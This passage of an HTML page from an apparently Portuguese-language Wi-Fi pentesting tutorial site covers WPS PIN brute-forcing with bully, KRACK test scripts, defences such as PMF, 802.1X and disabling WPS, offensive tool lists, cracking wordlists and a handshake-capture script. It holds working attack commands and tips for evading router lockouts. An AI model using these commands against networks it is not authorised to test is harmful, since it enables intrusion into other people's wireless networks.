+                <code><span class="cmd">sudo bully -b AA:BB:CC:DD:EE:FF -c 6 -d -v 3 wlan0mon</span></code>
+                <code><span class="comment"># -b: BSSID do AP alvo</span></code>
+                <code><span class="comment"># -c: Canal</span></code>
+                <code><span class="comment"># -d: Modo de depuração</span></code>
+                <code><span class="comment"># -v 3: Nível de verbosidade</span></code>
+                <code><span class="result">[+] Rx(  M1  ) = 'WPS Message M1'</span></code>
+                <code><span class="result">[+] Tx(  M2  ) = 'WPS Message M2'</span></code>
+                <code><span class="result">[+] Detected AP rate limiting, waiting 60 seconds before next pin attempt</span></code>
+                <code><span class="result">[+] Pin attempt count for '12345670' = 1</span></code>
+            </div>
+            
+            <div class="info-box tip">
+                <div class="info-box-title">Dicas para Ataques WPS Bem-Sucedidos</div>
+                <p>• Mantenha proximidade física do AP para sinais fortes<br>
+                • Use o parâmetro -r para contornar limitações de taxa<br>
+                • O parâmetro -L no reaver contorna bloqueios temporários<br>
+                • Em caso de lockout, aguarde 30-60 minutos<br>
+                • Alguns APs desabilitam WPS após múltiplas tentativas falhas</p>
+            </div>
+        </section>
+
+        <section id="krack" class="content-section">
+            <h2 class="section-title">Ataque KRACK</h2>
+            <p>O KRACK (Key Reinstallation Attack) é uma vulnerabilidade crítica descoberta em 2017 que afeta o protocolo WPA2, permitindo que atacantes interceptem e decodifiquem tráfego criptografado sem conhecer a senha da rede.</p>
+            
+            <div class="info-box warning">
+                <div class="info-box-title">Ataque Mitigado em Dispositivos Atualizados</div>
+                <p>A maioria dos dispositivos modernos já recebeu patches para mitigar o KRACK. Esta seção é apresentada principalmente para fins educacionais e compreensão histórica da evolução da segurança Wi-Fi.</p>
+            </div>
+            
+            <h3 class="section-subtitle">Princípio do KRACK</h3>
+            <p>O KRACK explora uma falha no 4-way handshake do WPA2, forçando a reinstalação de chaves já utilizadas e permitindo:</p>
+            <ul class="step-list">
+                <li>
+                    <div class="step-title">Manipulação do Handshake</div>
+                    <div class="step-desc">O atacante manipula e retransmite mensagens do handshake de 4 vias, forçando a reinstalação de chaves já em uso.</div>
+                </li>
+                <li>
+                    <div class="step-title">Resetar Nonces</div>
+                    <div class="step-desc">A reinstalação da chave reseta os nonces (números usados uma vez) e os contadores de replay, comprometendo a segurança do protocolo.</div>
+                </li>
+                <li>
+                    <div class="step-title">Descriptografia Parcial ou Total</div>
+                    <div class="step-desc">Dependendo do protocolo de criptografia (CCMP, GCMP, WPA-TKIP), o atacante pode decifrar dados, forjar pacotes ou injetar malware.</div>
+                </li>
+            </ul>
+            
+            <h3 class="section-subtitle">Ferramenta KRACK Demonstration</h3>
+            <p>A ferramenta krackattacks-scripts permite demonstrar e testar a vulnerabilidade:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">git clone https://github.com/vanhoefm/krackattacks-scripts.git</span></code>
+                <code><span class="cmd">cd krackattacks-scripts</span></code>
+                <code><span class="cmd">sudo apt-get install libnl-3-dev libnl-genl-3-dev pkg-config libssl-dev net-tools git sysfsutils python-scapy python-pycryptodome</span></code>
+                <code><span class="cmd">sudo python krack-test-client.py</span></code>
+                <code><span class="comment"># Este script verifica se um cliente é vulnerável ao KRACK</span></code>
+            </div>
+            
+            <h3 class="section-subtitle">Demonstração do Ataque</h3>
+            <p>Para fins educacionais, a ferramenta permite simular o ataque:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo python krack-all-zero-tk.py</span></code>
+                <code><span class="comment"># Este script demonstra a vulnerabilidade instalando uma chave de todos zeros</span></code>
+                <code><span class="result">[21:15:47] Starting hostapd</span></code>
+                <code><span class="result">[21:15:48] Starting channel X monitor interface on mon0</span></code>
+                <code><span class="result">[21:15:49] Ready. Connect a client to this hostapd AP to test if it's vulnerable.</span></code>
+            </div>
+            
+            <div class="info-box danger">
+                <div class="info-box-title">Limitações e Considerações</div>
+                <p>• O atacante deve estar próximo à vítima (dentro do alcance da rede)<br>
+                • Não quebra a senha da rede WiFi em si<br>
+                • O tráfego HTTPS permanece protegido (camada adicional)<br>
+                • A vulnerabilidade foi amplamente corrigida com atualizações<br>
+                • Afeta principalmente dispositivos antigos ou não atualizados</p>
+            </div>
+            
+            <h3 class="section-subtitle">Verificando Vulnerabilidade</h3>
+            <p>Para verificar se seus dispositivos são vulneráveis:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo python krack-test-client.py</span></code>
+                <code><span class="result">[+] AP transmitted data to client after key reinstallation</span></code>
+                <code><span class="result">[+] Client is vulnerable to key reinstallation in the 4-way handshake (CVE-2017-13077)</span></code>
+                <code><span class="comment"># Ou em caso negativo:</span></code>
+                <code><span class="result">[-] Client is NOT vulnerable to key reinstallation in the 4-way handshake</span></code>
+            </div>
+        </section>
+
+        <section id="defesas" class="content-section">
+            <h2 class="section-title">Técnicas de Defesa</h2>
+            <p>Entender como proteger redes Wi-Fi é tão importante quanto conhecer as técnicas de ataque. Esta seção apresenta métodos para defender redes sem fio contra as vulnerabilidades discutidas anteriormente.</p>
+            
+            <h3 class="section-subtitle">Proteção Contra Força Bruta WPA/WPA2</h3>
+            <p>Para proteger redes contra ataques de força bruta:</p>
+            
+            <div class="info-box tip">
+                <div class="info-box-title">Senhas Fortes</div>
+                <p>• Use senhas com pelo menos 12 caracteres<br>
+                • Combine letras maiúsculas, minúsculas, números e símbolos<br>
+                • Evite palavras de dicionário ou informações pessoais<br>
+                • Use geradores de senha aleatórios<br>
+                • Exemplo: <code>tK8&pQr$2L!9zB</code> é significativamente mais seguro que <code>Senha123!</code></p>
+            </div>
+            
+            <div class="code-box">
+                <code><span class="cmd">openssl rand -base64 12</span> <span class="comment"># Gera uma senha aleatória forte</span></code>
+                <code><span class="result">dBH7tP8JwQ3/Vx+1</span></code>
+            </div>
+            
+            <h3 class="section-subtitle">Proteção Contra Evil Twin</h3>
+            <p>Para proteger-se contra ataques de redes falsas:</p>
+            
+            <ol class="step-list">
+                <li>
+                    <div class="step-title">Implementar Autenticação 802.1X/EAP</div>
+                    <div class="step-desc">Use autenticação baseada em certificados para evitar que usuários se conectem a APs falsos. Isso requer uma infraestrutura de chave pública (PKI) e servidores RADIUS.</div>
+                </li>
+                <li>
+                    <div class="step-title">Monitoramento de Rogue AP</div>
+                    <div class="step-desc">Configure sistemas de detecção de intrusão sem fio (WIDS) para identificar APs não autorizados:</div>
+                </li>
+            </ol>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo apt install kismet</span></code>
+                <code><span class="cmd">sudo kismet -c wlan0</span></code>
+                <code><span class="comment"># Kismet detectará APs na área e alertará sobre possíveis clones</span></code>
+            </div>
+            
+            <h3 class="section-subtitle">Desativando WPS</h3>
+            <p>Para proteger contra ataques WPS:</p>
+            
+            <div class="info-box">
+                <div class="info-box-title">Acesso ao Roteador</div>
+                <p>1. Acesse a interface de administração do roteador (geralmente http://192.168.0.1 ou http://192.168.1.1)<br>
+                2. Navegue até as configurações wireless ou de segurança<br>
+                3. Localize as opções WPS e desative completamente<br>
+                4. Salve as configurações e reinicie o roteador</p>
+            </div>
+            
+            <h3 class="section-subtitle">Proteção Contra Desautenticação</h3>
+            <p>Mitigando ataques de desautenticação:</p>
+            
+            <div class="info-box">
+                <div class="info-box-title">802.11w (Management Frame Protection)</div>
+                <p>• Verifique se seu AP suporta 802.11w (PMF)<br>
+                • Ative a Proteção de Quadros de Gerenciamento nas configurações<br>
+                • Configure como "Obrigatório" para máxima proteção<br>
+                • Esteja ciente que dispositivos antigos podem não suportar PMF</p>
+            </div>
+            
+            <h3 class="section-subtitle">Segmentação de Rede</h3>
+            <p>Implementando isolamento e segmentação:</p>
+            
+            <ol class="step-list">
+                <li>
+                    <div class="step-title">VLANs para Isolamento</div>
+                    <div class="step-desc">Separe redes de convidados, IoT e corporativas em VLANs distintas para conter potenciais comprometimentos.</div>
+                </li>
+                <li>
+                    <div class="step-title">Isolamento de Cliente</div>
+                    <div class="step-desc">Ative o "Client Isolation" ou "AP Isolation" para impedir que clientes wireless se comuniquem diretamente entre si.</div>
+                </li>
+                <li>
+                    <div class="step-title">Firewall por SSID</div>
+                    <div class="step-desc">Configure regras de firewall específicas para cada SSID, limitando o acesso apenas aos recursos necessários.</div>
+                </li>
+            </ol>
+            
+            <h3 class="section-subtitle">Detecção de Intrusão Wireless</h3>
+            <p>Implementando WIDS/WIPS (Wireless Intrusion Detection/Prevention System):</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">sudo apt install kismet</span></code>
+                <code><span class="cmd">sudo kismet_server -c wlan0mon</span></code>
+                <code><span class="result">Server starting on port 2501</span></code>
+                <code><span class="comment"># Acesse http://localhost:2501 para monitorar atividades suspeitas</span></code>
+            </div>
+            
+            <div class="info-box">
+                <div class="info-box-title">Melhores Práticas Adicionais</div>
+                <p>• Troque o SSID padrão (mas não use informações identificáveis)<br>
+                • Atualize regularmente o firmware do roteador<br>
+                • Desative administração remota<br>
+                • Use endereços MAC estáticos para dispositivos críticos<br>
+                • Implemente autenticação em 2 fatores onde disponível<br>
+                • Considere redes mesh seguras para ambientes maiores</p>
+            </div>
+        </section>
+
+        <section id="outras-ferramentas" class="content-section">
+            <h2 class="section-title">Outras Ferramentas Avançadas</h2>
+            <p>Além das ferramentas principais mencionadas anteriormente, existem outras utilidades especializadas que podem auxiliar em testes de penetração Wi-Fi mais avançados e específicos.</p>
+            
+            <div class="tools-grid">
+                <div class="tool-card">
+                    <div class="tool-name"><i class="fas fa-fingerprint"></i> Fluxion</div>
+                    <div class="tool-desc">Framework para ataques avançados de Evil Twin com verificação de senha em tempo real através de portal captivo.</div>
+                    <div class="tool-usage">git clone https://github.com/FluxionNetwork/fluxion.git</div>
+                </div>
+                
+                <div class="tool-card">
+                    <div class="tool-name"><i class="fas fa-radiation"></i> Airgraph-ng</div>
+                    <div class="tool-desc">Cria gráficos de relacionamento entre APs e clientes, útil para mapear infraestruturas complexas.</div>
+                    <div class="tool-usage">sudo apt install aircrack-ng</div>
+                </div>
+                
+                <div class="tool-card">
+                    <div class="tool-name"><i class="fas fa-file-signature"></i> EAPHammer</div>
+                    <div class="tool-desc">Especializada em ataques contra redes empresariais que utilizam WPA2-Enterprise e 802.1X.</div>
+                    <div class="tool-usage">git clone https://github.com/s0lst1c3/eaphammer.git</div>
+                </div>
+                
+                <div class="tool-card">
+                    <div class="tool-name"><i class="fas fa-robot"></i> WiFi-Pumpkin</div>
+                    <div class="tool-desc">Framework para ataques MITM com recursos avançados como sniffing, phishing e DNS spoofing.</div>
+                    <div class="tool-usage">git clone https://github.com/P0cL4bs/WiFi-Pumpkin.git</div>
+                </div>
+                
+                <div class="tool-card">
+                    <div class="tool-name"><i class="fas fa-globe"></i> Ettercap</div>
+                    <div class="tool-desc">Ferramenta para ataques MITM com capacidade de interceptação e modificação de tráfego em tempo real.</div>
+                    <div class="tool-usage">sudo apt install ettercap-graphical</div>
+                </div>
+                
+                <div class="tool-card">
+                    <div class="tool-name"><i class="fas fa-bug"></i> WiFiBroot</div>
+                    <div class="tool-desc">Ferramenta especializada em ataques de força bruta WPA/WPA2 com múltiplos algoritmos de quebra.</div>
+                    <div class="tool-usage">git clone https://github.com/hash3liZer/WiFiBroot.git</div>
+                </div>
+                
+                <div class="tool-card">
+                    <div class="tool-name"><i class="fas fa-broadcast-tower"></i> Horst</div>
+                    <div class="tool-desc">Analisador de rede wireless com interface ncurses para monitoramento em tempo real de pacotes 802.11.</div>
+                    <div class="tool-usage">sudo apt install horst</div>
+                </div>
+                
+                <div class="tool-card">
+                    <div class="tool-name"><i class="fas fa-filter"></i> Wireshark-CLI</div>
+                    <div class="tool-desc">Versão de linha de comando (tshark) do Wireshark para análise de pacotes em scripts automatizados.</div>
+                    <div class="tool-usage">sudo apt install tshark</div>
+                </div>
+            </div>
+            
+            <h3 class="section-subtitle">Ferramentas Especializadas para WPA3</h3>
+            <p>Com a adoção do WPA3, novas ferramentas estão sendo desenvolvidas para testar sua segurança:</p>
+            
+            <div class="tools-grid">
+                <div class="tool-card">
+                    <div class="tool-name"><i class="fas fa-key"></i> Dragonblood</div>
+                    <div class="tool-desc">Framework para testar vulnerabilidades específicas do WPA3, incluindo ataques de side-channel e downgrade.</div>
+                    <div class="tool-usage">git clone https://github.com/vanhoefm/dragonblood.git</div>
+                </div>
+                
+                <div class="tool-card">
+                    <div class="tool-name"><i class="fas fa-tachometer-alt"></i> Dragondrain</div>
+                    <div class="tool-desc">Ferramenta para testar a resistência de implementações WPA3 contra ataques de negação de serviço.</div>
+                    <div class="tool-usage">git clone https://github.com/vanhoefm/dragonslayer.git</div>
+                </div>
+            </div>
+            
+            <h3 class="section-subtitle">Plataformas de Hardware Especializadas</h3>
+            <p>Para testes mais avançados, considere estas plataformas de hardware dedicadas:</p>
+            
+            <div class="comparison-table">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Dispositivo</th>
+                            <th>Descrição</th>
+                            <th>Uso Principal</th>
+                            <th>Preço Aproximado</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>WiFi Pineapple</td>
+                            <td>Plataforma especializada para auditoria de redes sem fio e ataques MITM</td>
+                            <td>Rogue AP, Evil Twin, Auditoria Wi-Fi</td>
+                            <td>$200-$300</td>
+                        </tr>
+                        <tr>
+                            <td>Flipper Zero</td>
+                            <td>Dispositivo multi-ferramenta para hacking físico e análise de RF</td>
+                            <td>Análise de protocolos, clonagem, BadUSB</td>
+                            <td>$150-$200</td>
+                        </tr>
+                        <tr>
+                            <td>ESP32 Marauder</td>
+                            <td>Ferramenta portátil de baixo custo baseada em ESP32 para pentesting Wi-Fi</td>
+                            <td>Deauth, Evil Twin, Sniffing</td>
+                            <td>$30-$100</td>
+                        </tr>
+                        <tr>
+                            <td>HackRF One</td>
+                            <td>Transceptor de rádio definido por software (SDR) para análise de sinais</td>
+                            <td>Análise de protocolos, Captura de tráfego</td>
+                            <td>$300-$500</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+        <section id="recursos" class="content-section">
+            <h2 class="section-title">Recursos Adicionais</h2>
+            <p>Para aprofundar seus conhecimentos em Wi-Fi pentesting, recomendamos os seguintes recursos educacionais:</p>
+            
+            <h3 class="section-subtitle">Wordlists Especializadas</h3>
+            <p>Wordlists eficazes são cruciais para ataques de dicionário bem-sucedidos:</p>
+            
+            <div class="info-box">
+                <div class="info-box-title">Wordlists Recomendadas</div>
+                <p>• <strong>RockYou</strong>: /usr/share/wordlists/rockyou.txt (14 milhões de senhas)<br>
+                • <strong>SecLists</strong>: Coleção de múltiplas listas para diferentes cenários<br>
+                • <strong>CrackStation</strong>: Lista de +1.4 bilhão de senhas de vazamentos<br>
+                • <strong>WPA-PSK WORDLIST 3</strong>: Especializada em senhas WPA comuns<br>
+                • <strong>WEAKPASS</strong>: Compilação de senhas fracas e padrões de fabricantes</p>
+            </div>
+            
+            <div class="code-box">
+                <code><span class="cmd">git clone https://github.com/danielmiessler/SecLists.git</span></code>
+                <code><span class="cmd">cd SecLists/Passwords</span> <span class="comment"># Várias categorias de wordlists</span></code>
+            </div>
+            
+            <h3 class="section-subtitle">Laboratórios Virtuais</h3>
+            <p>Pratique em ambientes seguros e legais:</p>
+            
+            <div class="info-box tip">
+                <div class="info-box-title">Laboratórios para Prática</div>
+                <p>• <strong>VulnHub</strong>: Várias VMs com desafios Wi-Fi para download<br>
+                • <strong>Hack The Box</strong>: Plataforma com desafios de segurança online<br>
+                • <strong>TryHackMe</strong>: Rooms dedicados a Wi-Fi hacking<br>
+                • <strong>PentesterLab</strong>: Exercícios guiados em pentesting</p>
+            </div>
+            
+            <h3 class="section-subtitle">Cursos e Certificações</h3>
+            <p>Para treinamento formal em Wi-Fi pentesting:</p>
+            
+            <div class="comparison-table">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Certificação</th>
+                            <th>Organização</th>
+                            <th>Foco</th>
+                            <th>Nível</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>OSWP</td>
+                            <td>Offensive Security</td>
+                            <td>Pentesting Wi-Fi</td>
+                            <td>Intermediário</td>
+                        </tr>
+                        <tr>
+                            <td>CWSP</td>
+                            <td>CWNP</td>
+                            <td>Segurança Wi-Fi</td>
+                            <td>Avançado</td>
+                        </tr>
+                        <tr>
+                            <td>CEH</td>
+                            <td>EC-Council</td>
+                            <td>Hacking Ético (inclui Wi-Fi)</td>
+                            <td>Intermediário</td>
+                        </tr>
+                        <tr>
+                            <td>PNPT</td>
+                            <td>TCM Security</td>
+                            <td>Pentesting Prático</td>
+                            <td>Intermediário</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+            
+            <h3 class="section-subtitle">Ferramentas Online</h3>
+            <p>Recursos online para complementar seus testes:</p>
+            
+            <div class="info-box">
+                <div class="info-box-title">Úteis para Wi-Fi Pentesting</div>
+                <p>• <strong>RouterScan</strong>: Base de dados de senhas padrão de roteadores<br>
+                • <strong>WiGLE</strong>: Base de dados mundial de redes sem fio<br>
+                • <strong>MAC Address Lookup</strong>: Identificação de fabricantes por MAC<br>
+                • <strong>WiFi Analyzer</strong>: Apps para análise de canais e sinal</p>
+            </div>
+            
+            <h3 class="section-subtitle">Scripts e Frameworks Personalizados</h3>
+            <p>Para automação de testes recorrentes, considere desenvolver scripts personalizados:</p>
+            
+            <div class="code-box">
+                <code><span class="cmd">cat wifi_scan.sh</span></code>
+                <code><span class="result">#!/bin/bash</span></code>
+                <code><span class="result"># Script simples para automação de captura de handshakes</span></code>
+                <code><span class="result"></span></code>
+                <code><span class="result">INTERFACE="wlan0mon"</span></code>
+                <code><span class="result">OUTDIR="./capturas"</span></code>
+                <code><span class="result"></span></code>
+                <code><span class="result"># Verificar se interface existe</span></code>
+                <code><span class="result">if ! ip link show $INTERFACE &>/dev/null; then</span></code>
+                <code><span class="result">    echo "Interface $INTERFACE não encontrada."</span></code>
+                <code><span class="result">    echo "Ativando modo monitor..."</span></code>
+                <code><span class="result">    sudo airmon-ng start wlan0</span></code>
+                <code><span class="result">fi</span></code>
+                <code><span class="result"></span></code>
+                <code><span class="result"># Criar diretório se não existir</span></code>
+                <code><span class="result">mkdir -p $OUTDIR</span></code>
+                <code><span class="result"></span></code>
+                <code><span class="result"># Escanear redes</span></code>
+                <code><span class="result">echo "Escaneando redes por 30 segundos..."</span></code>
+                <code><span class="result">sudo airodump-ng $INTERFACE -w $OUTDIR/scan --output-format csv --write-interval 1 &</span></code>
+                <code><span class="result">SCAN_PID=$!</span></code>
+                <code><span class="result">sleep 30</span></code>
+                <code><span class="result">kill $SCAN_PID</span></code>
+                <code><span class="result"></span></code>
+                <code><span class="result"># Processar resultados</span></code>
+                <code><span class="result">echo "Processando resultados..."</span></code>
+                <code><span class="result"># Script continua com processamento dos resultados</span></code>
+            </div>
+        </section>
+
+        <div class="back-to-top" id="backToTop">
+            <i class="fas fa-arrow-up"></i>
+        </div>
+    </div>
+
+    <footer>
+        <div class="container">
+            <div class="footer-container">
+                <div class="footer-logo">CyberHack</div>
+                <div class="footer-links">
+                    <a href="#">Termos de Uso</a>
+                    <a href="#">Política de Privacidade</a>
+                    <a href="#">FAQ</a>
+                    <a href="contato.html">Contato</a>
+                </div>
+                <div class="social-links">
+                    <a href="#"><i class="fab fa-discord"></i></a>
+                    <a href="#"><i class="fab fa-github"></i></a>
+                    <a href="#"><i class="fab fa-youtube"></i></a>
+                    <a href="#"><i class="fab fa-telegram"></i></a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <div id="overlay"></div>
+
+    <script>
+        const canvas = document.getElementById('canvas');
+        const renderer = new THREE.WebGLRenderer({
+            canvas,
+            antialias: true,
+            alpha: true
+        });
+        renderer.setSize(window.innerWidth, window.innerHeight);
+        renderer.setPixelRatio(window.devicePixelRatio);
+
+        const scene = new THREE.Scene();
+        const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+        camera.position.z = 5;
+
+        const particlesGeometry = new THREE.BufferGeometry();
+        const particlesCount = 2000;
+        
+        const positions = new Float32Array(particlesCount * 3);
+        const colors = new Float32Array(particlesCount * 3);
+        const sizes = new Float32Array(particlesCount);
+        
+        for (let i = 0; i < particlesCount * 3; i += 3) {
+            positions[i] = (Math.random() - 0.5) * 20;
+            positions[i + 1] = (Math.random() - 0.5) * 20;
+            positions[i + 2] = (Math.random() - 0.5) * 20;
+            
+            colors[i] = Math.random() * 0.5 + 0.5;
+            colors[i + 1] = Math.random() * 0.2;
+            colors[i + 2] = Math.random() * 0.5 + 0.5;
+            
+            sizes[i/3] = Math.random() * 0.5 + 0.5;
+        }
+        
+        particlesGeometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+        particlesGeometry.setAttribute('color', new THREE.BufferAttribute(colors, 3));
+        particlesGeometry.setAttribute('size', new THREE.BufferAttribute(sizes, 1));
+        
+        const particlesMaterial = new THREE.PointsMaterial({
+            size: 0.1,
+            vertexColors: true,
+            transparent: true,
+            opacity: 0.8,
+            sizeAttenuation: true,
+            map: createCircleTexture()
+        });
+        
+        function createCircleTexture() {
+            const canvas = document.createElement('canvas');
+            canvas.width = 64;
+            canvas.height = 64;
+            
+            const context = canvas.getContext('2d');
+            context.clearRect(0, 0, canvas.width, canvas.height);
+            
+            const centerX = canvas.width / 2;
+            const centerY = canvas.height / 2;
+            const radius = canvas.width / 2.5;
+            
+            context.beginPath();
+            context.arc(centerX, centerY, radius, 0, 2 * Math.PI, false);
+            
+            const gradient = context.createRadialGradient(centerX, centerY, 0, centerX, centerY, radius);
+            gradient.addColorStop(0, 'rgba(255, 255, 255, 1)');
+            gradient.addColorStop(0.5, 'rgba(255, 105, 180, 0.8)');
+            gradient.addColorStop(1, 'rgba(255, 105, 180, 0)');
+            
+            context.fillStyle = gradient;
+            context.fill();
+            
+            const texture = new THREE.Texture(canvas);
+            texture.needsUpdate = true;
+            return texture;
+        }
+        
+        const particles = new THREE.Points(particlesGeometry, particlesMaterial);
+        scene.add(particles);
+
+        let mouseX = 0;
+        let mouseY = 0;
+        let targetX = 0;
+        let targetY = 0;
+        
+        document.addEventListener('mousemove', (event) => {
+            mouseX = (event.clientX / window.innerWidth) * 2 - 1;
+            mouseY = -(event.clientY / window.innerHeight) * 2 + 1;
+        });
+
+        function animate() {
+            requestAnimationFrame(animate);
+            
+            targetX = mouseX * 0.2;
+            targetY = mouseY * 0.2;
+            
+            particles.rotation.x += 0.0005;
+            particles.rotation.y += 0.001;
+            
+            particles.rotation.y += (targetX - particles.rotation.y) * 0.05;
+            particles.rotation.x += (targetY - particles.rotation.x) * 0.05;
+            
+            const positions = particles.geometry.attributes.position.array;
+            for (let i = 0; i < positions.length; i += 3) {
+                positions[i + 1] += Math.sin(Date.now() * 0.001 + positions[i] * 0.1) * 0.002;
+            }
+            particles.geometry.attributes.position.needsUpdate = true;
+            
+            renderer.render(scene, camera);
+        }
+
+        window.addEventListener('resize', () => {
+            camera.aspect = window.innerWidth / window.innerHeight;
+            camera.updateProjectionMatrix();
+            renderer.setSize(window.innerWidth, window.innerHeight);
+        });
+
+        animate();
+
+        
+        const backToTopButton = document.getElementById('backToTop');
+        
+        window.addEventListener('scroll', () => {
+            if (window.pageYOffset > 300) {
+                backToTopButton.classList.add('active');
+            } else {
+                backToTopButton.classList.remove('active');
+            }
+        });
+        
+        backToTopButton.addEventListener('click', () => {
+            window.scrollTo({
+                top: 0,
+                behavior: 'smooth'
+            });
+        });
+
+        
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                const targetId = this.getAttribute('href');
+                const targetElement = document.querySelector(targetId);
+                
+                if (targetElement) {
+                    window.scrollTo({
+                        top: targetElement.offsetTop - 100,
+                        behavior: 'smooth'
+                    });
+                }
+            });
+        });
+        
+        
+        const mobileMenuBtn = document.querySelector('.mobile-menu-btn');
+        const overlay = document.getElementById('overlay');
+        
+        if (mobileMenuBtn) {
+            mobileMenuBtn.addEventListener('click', () => {
+                document.querySelector('.mobile-menu').classList.add('active');
+                overlay.classList.add('active');
+            });
+        }
+        
+        if (overlay) {
+            overlay.addEventListener('click', () => {
+                document.querySelector('.mobile-menu').classList.remove('active');
+                overlay.classList.remove('active');
+            });
+        }
+        
+        
+        const mobileMenuCloseBtn = document.querySelector('.mobile-menu-close');
+        if (mobileMenuCloseBtn) {
+            mobileMenuCloseBtn.addEventListener('click', () => {
+                document.querySelector('.mobile-menu').classList.remove('active');
+                overlay.classList.remove('active');
+            });
+        }
+    </script>
+</body>
+</html>
+            
